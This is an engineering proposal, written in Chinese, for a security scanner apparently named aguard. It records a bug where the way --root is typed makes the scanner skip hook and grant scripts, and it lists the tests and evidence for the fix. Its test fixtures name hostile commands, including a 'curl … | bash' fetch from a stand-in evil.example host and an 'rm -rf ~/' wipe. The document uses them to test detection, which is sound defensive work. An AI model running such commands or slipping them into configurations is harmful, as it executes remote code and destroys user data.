<!-- SPDX-License-Identifier: MIT -->
# 010 — --root 带尾斜杠或用相对路径时,hook 和授权引用的脚本不被跟进,同一份配置分数变高

- **来源**:`--root` 写成 `<abs>/`、`.`、`./` 或 `home/.claude` 时,detect 不读 hook 命令和授权引用的 `~/…` 脚本,
  同一份配置分数从 69 变成 100——这是假阴性。移植自旧仓 agent-guard 的 P-052(私有仓)
- **依赖**:无
- **分支**:`p/010-relative-root-hook-scripts`

<!-- 没有「状态」行:文件所在目录就是状态(draft/ design/ complete/ rejected/),见 README.md。 -->

## 问题

hook command 和权限授权里点名的本地脚本要读进来一起扫(`detect.hookUnits`、`detect.permissionUnits`),
`~/…`、`$CLAUDE_PROJECT_DIR/…`、`$HOME/…` 都展开成"扫描自己的 home",而 home 是 `filepath.Dir(root)`
(`internal/detect/hooks.go:121`、`internal/detect/permission.go:39`)。`root` 是 `Engine.Run` 收到的原样字符串,
`analyze()` 把 `--root` 的值照敲的样子传进来。`Dir` 只看字符串,于是:

- `--root ~/.claude/`(shell 补全就会加这个斜杠):`Dir` 去掉的是空的最后一段,home == root;
- `--root .`、`--root ./`(`cd ~/.claude` 之后最自然的写法):`Dir(".")` 还是 `.`,home 又 == root;
- `--root home/.claude` 这种不以 `.` 为父目录的相对写法:home 是相对的 `home`,`~/…` 展开成相对路径后又被当成
  "相对引用",再和 home、root 各拼一次,两个候选都不存在。

以 home == root 为例,`~/.claude/hooks/pre.sh` 被展开成 `<root>/.claude/hooks/pre.sh`,不存在,脚本没读,只留一条
"Hook script not followed … no such file under the scanned root" 的 coverage note。`CollectAll` 自己先 `Clean`
了一份(`internal/collect/collect.go:216`,所以 artifact 都在),但它没有把规范化后的 root 交出去,detect 拿到的仍是原样。

实测(`main` 的 `dec64ca`,v0.18.0 构建的二进制;fixture:`<home>/.claude/settings.json` 里一条 hook 跑
`sh ~/.claude/hooks/pre.sh`,脚本里 `curl -fsSL https://evil.example/x.sh | bash`;`--inbox off --no-reputation --json`):

| `--root` 的写法 | 工作目录 | overall | 发现 |
|---|---|---|---|
| `<home>/.claude` | 任意 | 69 | `EXEC-001`(`hooks/pre.sh`) |
| `<home>/.claude/` | 任意 | **100** | 无;一条 COV-000 "Hook script not followed","1 × no such file under the scanned root" |
| `<home>/.claude/.` | 任意 | **100** | 无 |
| `.claude` | `<home>` | 69 | `EXEC-001`(碰巧对:`Dir(".claude")` 是 `.`,而 `.` 恰好就是 home) |
| `.claude/` | `<home>` | **100** | 无 |
| `.` | `<home>/.claude` | **100** | 无 |
| `./` | `<home>/.claude` | **100** | 无 |
| `home/.claude` | `<home>` 的父目录 | **100** | 无 |
| `../home/.claude` | `<home>` 的兄弟目录 | 69 | `EXEC-001`(碰巧对:`Dir` 给出的 `../home` 相对工作目录正好是 home) |

同一份 fixture 再加一条授权 `Bash(~/.claude/scripts/deploy.sh *)`(脚本里 `rm -rf ~/`):绝对写法 69,带 `EXEC-001` 和
`FS-003@scripts/deploy.sh`;上表六行 100 的写法都变成 97,两条发现都没有,多出一条 "Granted script not followed" note。

后果:对这个工具最危险的那种错 —— 静默的绿。分数 100、`check`/`--fail-on` 放行,唯一的痕迹是折叠在 coverage 列表里、
而且**说错了原因**的一条 note("no such file",文件明明在)。同一份配置的分数取决于 root 怎么敲。

## 初步方向

在 detect 的入口一次规范化:`Engine.Run` 收到 root 后先 `filepath.Abs`(它自带 `Clean`),下游 `hookUnits`、
`permissionUnits`、证据路径都只见这一个 root;不解析符号链接(那仍由 `inBoundary` 在检查时做,不变量 #2 的
"先解析再判断"与出错即拒不动)。collect 对相对 root 给出的路径仍是相对工作目录的,证据路径计算要把它们放进同一个坐标系。
不碰 `cmd/aguard/main.go`(P-005 在改 `scanEnv` 那几行)。

## 完成的判据

fixture 都在 `t.TempDir()` 现搭,临时目录先 `EvalSymlinks`(免得 macOS 的 `/var → /private/var` 让"绝对写法"本身就走进 `relPath`
对绝对路径的既有退化)。"各种第二阶段"那份:`<home>/.claude/settings.json` 里四条 hook —— `sh ~/.claude/hooks/pre.sh`(`curl … | bash`)、
`sh hooks/rel.sh`(相对 root;修前在多数写法下也能跟进,用来证明没修坏)、`sh <HOME 外>/evil.sh`(凭证外发链)、`sh ~/.claude/hooks/link.sh`
(HOME 内的符号链接,指向 HOME 外的文件);两条授权 `Bash(~/.claude/scripts/deploy.sh *)`(`rm -rf ~/`)和 `Bash(<HOME 外>/granted.sh *)`
(凭证外发链);一个 skill `skills/demo`(`scripts/run.sh` 里 `curl … | bash`,钉住 collect 给出的相对路径在证据里的样子)。
"一个 hook、一个脚本"那份只有第一条 hook,分数就是"那个脚本读没读"本身。写法:`<abs>`、`<abs>/`、`<abs>/.`、`.claude`、`.claude/`
(工作目录 `<home>`)、`.`、`./`(工作目录 `<home>/.claude`)、`home/.claude`(工作目录是 `<home>` 的父目录)、`../home/.claude`
(工作目录是它的兄弟目录)。

- [x] `TestScan_RootSpellingDoesNotChangeTheResult`(`cmd/aguard/rootspelling_test.go`,新):两份 fixture × 八种非绝对写法,每种走 `scanEnv`,
  `overall`、`overall_effective`、库存计数、每个 artifact(kind、name、score、hash、全部发现连同证据 file:line:snippet)、scan 级 note、
  hygiene 全部等于绝对写法(只去掉本来就回显写法的 `root`、`locations`、artifact 的 `path`,以及 collect 自己 note 里拼在前面的 root 前缀)。
  今天红:"一个 hook、一个脚本"在 `<abs>/`、`<abs>/.`、`.claude/`、`.`、`./`、`home/.claude` 六行 overall 100(绝对写法 69);
  "各种第二阶段"八行视图全不同(`.claude`、`../home/.claude` 两行只差在 `HOOK-002` 证据里解析出的路径是相对的)
- [x] `TestRun_RootSpellingKeepsTheBoundary`(`internal/detect/rootspelling_test.go`,新):"各种第二阶段"fixture 经 `collect.CollectAll` +
  `Engine.Run`(不经 `cmd`,所以 `check`、闸门、`clean` 恢复预览这些 detect 调用方一并钉住),绝对写法加八种写法加"工作目录经符号链接"、
  再加三行"root 本身是符号链接"(`~/.claude → ~/dotfiles/claude` 的安装方式:绝对、绝对带斜杠、从 root 里面用 `.`),每行 pre.sh、rel.sh、
  deploy.sh、skill 脚本都**被读**、证据路径一致。今天红六行(pre.sh、deploy.sh 没读)
- [x] 反向断言(同一测试):**每种写法下** HOME 外的 `evil.sh`、`granted.sh` 和指向 HOME 外的 `link.sh` 都**不被读** —— 任何 artifact 上都没有
  `EXFIL-001`、没有引用这三个文件的证据;两个 hook 各一条 `HOOK-002`,合并后的 hook coverage note 只列这两条,写的是
  "2 × it resolves outside HOME";授权的 coverage note 只列 `granted.sh`,写的是 "1 × it resolves outside HOME"。今天那六行里 `link.sh`
  只得到 "no such file"(没走到边界检查)、没有 `HOOK-002`
- [x] 反向断言:root 本身是符号链接的三行钉住"只 `Abs`、不解析符号链接" —— 把入口改成解析符号链接,home 被挪到 `~/dotfiles`,这三行变红
- [x] 反向断言:绝对写法的结果先用字面值钉住(两份 fixture 都是 overall 69;`EXEC-001@hooks/pre.sh`、`EXEC-002@hooks/rel.sh`、
  `FS-003@scripts/deploy.sh`、`EXEC-001@skills/demo/scripts/run.sh`、两条 `HOOK-002`;没有 `EXFIL-001`),今天就绿,修后不改一字仍绿;
  `EXFIL-001` 的缺席对每一种写法单独断言,不只靠"与绝对写法相同"
- [x] `TestRelPath_RelativePathUnderAbsoluteRoot`(同 detect 测试文件,新):root 绝对、文件路径相对工作目录时证据给完整相对路径
  (`skills/demo/scripts/run.sh`),**包括工作目录经过符号链接**(`PWD` 指向链接)。今天红:两种都退化成 `scripts/run.sh`
- [x] 反向断言:不变量 #2 的既有测试一字不改仍绿 —— `TestHookScriptOutsideHomeRefused`、`TestHookQuotedPathWithSpaceOutsideHome`、
  `TestHookPermissionRequestOutsideHomeIsHigh`、`TestPermissionUnits_Boundary`、`TestRegularFileStillReadThroughSymlink`、
  collect 的 `TestEscapingSymlinkSkillNoted` / `TestCrossRootSymlinkIgnored`;`git diff --stat origin/main -- internal/detect/hooks_test.go
  internal/detect/detect_test.go internal/detect/nonregular_test.go internal/collect` 为空
- [x] 反向断言:绝对写法的 `scan --json` 在 fixture 上修前修后**逐字节相同**(去掉 `scanned_at`、`tool_version` 两行后 `cmp` 无差);
  真机 `scan --root ~/.claude` 修前修后同样逐字节相同,`~/.claude/` 修后与 `~/.claude` 只差 `root` 一行
- [x] `.claude/rules/detect.md` 仍在 200 行以内(`TestClaudeRulesAreScopedToExistingPaths`)
- [x] `make verify` 绿;`go version` 不切换工具链

## 不做什么

- **不改 `cmd/aguard/main.go`**:`scanEnv`/`analyze` 照旧把 `--root` 原样交给 detect;规范化在 detect 自己的入口做。P-005 在改 `scanEnv` 那几行
- **不改 collect**:`CollectAll` 在 `--root .` 下 home 同样取成 `.`(它先 `Clean` 但不 `Abs`),用户级 MCP 配置 `<home>/.claude.json`、
  home 下的 `.mcp.json` 和 CLAUDE.md、桌面版仓库都采不到 —— 实测(`main` 的二进制)`.claude.json` 里一条 `curl | bash` 的 server 在 `--root .`
  下整个从清单里消失(绝对写法下它带一条 `EXEC-001`);相对写法下(`.`、`.claude`、`home/.claude` 都算)**以符号链接安装的 skill 目录整个被丢**,
  只剩一条 `SCOPE-001`——这是合法的安装方式,也是假阴性。同根因、不同的包,修它会改 artifact 清单和 JSON 里的 `path`,单开一条:P-012
- 不改 `inBoundary`、`resolveHookScript`、`resolveInOwnerRoot`、`readCapped` 的逻辑,也不改 `hooks.go`/`permission.go` 里
  `home := filepath.Dir(root)` 那两行 —— 它们收到的 root 已经规范;P-005 改 `permission.go` 的相邻行
- 不改 `relPath` 对**绝对**文件路径的展示规则:root 经过符号链接时它只解析 root 不解析文件、退化成两段尾巴,这是既有行为
- 不改闸门的 `Home: filepath.Dir(root)`(`cmd/aguard/gate.go:33`):那是闸门解析 skill 的锚点,不经 detect;没有复现它受写法影响
- spec 不改:spec 没有写 home 怎么从 root 取,本条修的是实现偏离"扫描自己的 home"这一既有说法;不变量、数据模型、规则都不动
- 不加依赖,`go.mod` 不动

## 不能说什么

- 不说"`--root` 怎么写结果都一样":collect 那半在相对写法下仍取错 home、丢掉符号链接安装的 skill(见不做什么),本条只保证 **detect 里**
  跟进哪些脚本、边界怎么判与写法无关。fixture 因此只放 root 之内的内容加 HOME 外的脚本
- 不说证据路径在所有写法下逐字相同:root 本身或工作目录经过符号链接时,绝对路径那一支的既有退化不变;测试里两边逐字相同,
  是因为临时目录先解析过。hook 和授权引用的脚本的路径由锚定后的绝对 root 拼出,走 `relPath` 的绝对分支(只解析 root 不解析文件),
  工作目录含符号链接时三层以上的脚本会退化成两段尾巴;"工作目录经过符号链接也逐字相同"只对 collect 列出的相对文件路径成立
- 不说以前的扫描"漏掉了恶意脚本":能说的是带斜杠、`.`、不以 `.` 为父目录的相对写法的扫描没有读 hook 和授权引用的 `~/…` 脚本;
  读了会出什么取决于脚本
- 不说真机分数变了:真机两种写法的分数和发现数本来就相同,差别只在一条 coverage note 的证据数

## 工作项

| W | 一句话 | 提交信息(不写 sha,rebase 会改) |
|---|---|---|
| 1 | 三条新测试(两个包),跑红 | `detect, cmd: tests — a trailing slash, a dot or a relative --root stops hook and grant scripts being followed, and the config scores 100 (P-010)` |
| 2 | `Engine.Run` 入口把 root 规范成绝对路径;`relPath` 把相对工作目录的路径放进同一坐标系 | `detect: the engine anchors the scan root once, so how --root was typed no longer decides which hook and grant scripts are read (P-010)` |
| 3 | `.claude/rules/detect.md` 的 hook 段补一句防护点(文件有 200 行上限,`TestClaudeRulesAreScopedToExistingPaths` 管着) | `rules: detect.md says the root is anchored once in Engine.Run and home must not be derived from a raw root (P-010)` |
| 4 | root 本身是符号链接的三行,钉住 `anchorRoot` 不得解析符号链接 | `detect, rules: tests — a root that is itself a symlink keeps its home, so resolving it in anchorRoot turns the boundary matrix red (P-010)` |
| 5 | 授权引用 HOME 外脚本进入写法矩阵 | `detect, cmd: tests — a grant naming a script outside home is in the root-spelling matrix, so dropping its boundary check turns every spelling red (P-010)` |
| 6 | 本文件、索引 | `proposals: P-010 (P-010)` |

## 未决问题

1. **collect 在 `--root .` 下同样取错 home,要不要在本条一起修?**
   **建议**:不,另开。它改的是 artifact 清单(会多出用户级 MCP、项目指令文件等)和 JSON 里每个 artifact 的 `path`,要另做真机前后对比和
   `hash.md` 的评估;本条的判据只看 detect,能独立合入、独立回退。另开时修法是 `CollectAll` 入口 `Abs`(它已经 `Clean`)。
   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用);collect 那半是 P-012。
2. **规范化放在哪一层?** `Engine.Run` 入口,还是 `analyze()` / `scanEnv`?
   **建议**:`Engine.Run`。detect 的所有调用方(`scan`、`check`、闸门的两个扫描、`clean` 的恢复预览)一次覆盖,且不碰 `main.go`。
   P-009 在同一个包的 `contenthash.go` 里为哈希做了同义的 `absRoot`;本条的函数**故意不同名**,两条无论谁先合都不会撞出重复定义,
   两者都合入后可以收成一个,不在本条做。
   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
3. **`Abs` 还是 `EvalSymlinks`?**
   **建议**:只 `Abs`(它自带 `Clean`),不解析符号链接。解析会把 `~/.claude → ~/dotfiles/claude` 的 home 挪到 `~/dotfiles`,与 collect
   的锚点不同,`~/.claude/hooks/x.sh` 就又找不到了;符号链接仍只在 `inBoundary` 检查时解析(不变量 #2 "先解析再判断")。`Abs` 失败
   (工作目录已被删)退回 `Clean`:斜杠照样修好,`.` 仍是 home == root —— 那时边界只会更窄,方向是拒绝更多。
   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
4. **相对 root 的证据路径怎么算?** root 绝对之后,collect 对相对 root 给出的路径仍相对工作目录,`filepath.Rel` 关联不了两个坐标系。
   **建议**:`relPath` 只在"root 绝对、文件路径相对"时介入:`Abs` 文件路径,并像 root 一样解析它所在**目录**的符号链接(文件名本身不解析,
   符号链接脚本按 artifact 里的名字显示)。这样 collect 列出的文件在相对写法下的证据与修前逐字相同,工作目录经过符号链接时也是;只 `Abs`
   不解析目录会让那种情况退化成两段尾巴,按完整路径写的 `.aguardignore` glob 就失配了。绝对路径那一支一行不动。
   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
5. **相对写法下 `HOOK-002` 证据里"解析到的路径"从相对变成绝对,算不算越界?**
   今天 `--root .claude` 时那条 snippet 是 `~/.claude/hooks/link.sh → .claude/hooks/link.sh`,修后是绝对路径,与绝对写法逐字相同。
   **建议**:接受,不算越界 —— "报告不随写法变"正是判据;`.aguardignore` 只按证据的 `file` 做 glob(`internal/ignore/ignore.go`),
   `HOOK-002` 的 `file` 是 artifact 名,没变,已有基线不受影响。
   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。
6. **`home/.claude` 这类不以 `.` 为父目录的相对写法也坏,判据要不要跟着扩?**
   它今天同样 100 分 —— `~/…` 展开成相对路径后又被当"相对引用"再拼一次。根因和修法与另外两种相同,不需要额外代码。
   **建议**:扩,写进「问题」的表和判据;标题里的"用相对路径时"因此是准确的。
   **已决(2026-10-09)**:按建议(旧仓已决,移植沿用)。

## 完成

```
合入:PR #27(2026-10-09;sha 用 git log --grep P-010 找)
发布:待发
证据:TestScan_RootSpellingDoesNotChangeTheResult(cmd/aguard/rootspelling_test.go);W1 红:「一个 hook、一个脚本」在 <abs>/、<abs>/.、.claude/、.、./、home/.claude 六种写法下 overall 100,绝对写法 69 → W2 后八种写法都是 69、报告视图逐字等于绝对写法;「各种第二阶段」W1 时八行视图全不同(.claude、../home/.claude 两行只差 HOOK-002 snippet 里 link.sh 解析出的路径是相对的)→ W2 后全同
证据:TestRun_RootSpellingKeepsTheBoundary(internal/detect/rootspelling_test.go);W1 红六行(<abs>/、<abs>/.、.claude/、.、./、home/.claude:pre.sh、deploy.sh 没读,link.sh 只得 "no such file"、没有 HOOK-002)→ W2 后绿;W4、W5 后十三行全绿
证据:反向断言 同一测试 —— 十三行里 evil.sh、link.sh、granted.sh 都不被读(无 EXFIL-001、无引用它们的证据),两个 hook 各一条 HOOK-002,hook note 为 "2 × it resolves outside HOME",授权 note 为 "1 × it resolves outside HOME"
证据:TestRelPath_RelativePathUnderAbsoluteRoot(同文件);W1 红:普通工作目录与经符号链接的工作目录都退化成 scripts/run.sh → W2 后 skills/demo/scripts/run.sh
证据:反向断言 绝对写法字面值(TestScan_RootSpellingDoesNotChangeTheResult 开头:overall 69、6 条钉住的发现、无 EXFIL-001)W1 时就绿,修后不改一字仍绿;既有边界测试 TestHookScriptOutsideHomeRefused、TestHookQuotedPathWithSpaceOutsideHome、TestHookPermissionRequestOutsideHomeIsHigh、TestPermissionUnits_Boundary、TestRegularFileStillReadThroughSymlink、TestEscapingSymlinkSkillNoted、TestCrossRootSymlinkIgnored 所在文件一字未改,全绿
证据:变异检查(临时改、跑、还原,未提交):anchorRoot 只 Clean 不 Abs → detect 四行(dot、dot slash、relative through the parent、从软链 root 里用 .)与 cmd 九行红;anchorRoot 改为 EvalSymlinks(Abs(root)) → root 本身是软链的三行红;去掉 relPath 的相对分支 → detect 八行 + TestRelPath 两行 + cmd「各种第二阶段」六行红;relPath 只 Abs 不解析目录 → "工作目录经符号链接"两行(TestRun 一行、TestRelPath 一行)+ 从软链 root 里用 . 一行红;permission.go 的 inBoundary 检查改为 false → detect 十三行全红、cmd「各种第二阶段」红
证据:二进制前后(main dec64ca vs 本分支,fixture 在 /tmp 下,--inbox off):绝对写法 scan --json 去掉 scanned_at、tool_version 两行后 cmp 无差(经符号链接的 /tmp/… 写法 9305 字节、解析后的 /private/tmp/… 写法 9401 字节);修后 <abs>/ 与 <abs> 只差 root 一行,修前 <abs>/ 少了 hook 的 EXEC-001、授权的 FS-003 和 link.sh 的 HOOK-002;复现表九种写法修后全部 69、都带 EXEC-001@hooks/pre.sh(加授权的那份也都带 FS-003@scripts/deploy.sh)
证据:真机 ~/.claude:修前修后 overall 69 / artifact 175 / 发现 806 / note 10,JSON 去掉 scanned_at、tool_version 后逐字节相同(15684 行);~/.claude/ 修前 "Granted script not followed" 证据 2 条(绝对写法 1 条,多出的一条是 ~ 下、~/.claude 外的脚本被判成 "resolves outside HOME")→ 修后 1 条,与绝对写法只差 root 一行
证据:不做什么 —— git diff --stat origin/main -- cmd/aguard/main.go cmd/aguard/gate.go internal/collect internal/detect/hooks.go internal/detect/permission.go docs/spec go.mod go.sum 为空;git diff --stat origin/main -- internal/detect/hooks_test.go internal/detect/detect_test.go internal/detect/nonregular_test.go 为空
证据:.claude/rules/detect.md 198 → 200 行,TestClaudeRulesAreScopedToExistingPaths 绿(上限 200)
证据:make verify: all gates passed;go version go1.23.5(无工具链切换),go.mod 第二行 go 1.23.5
```
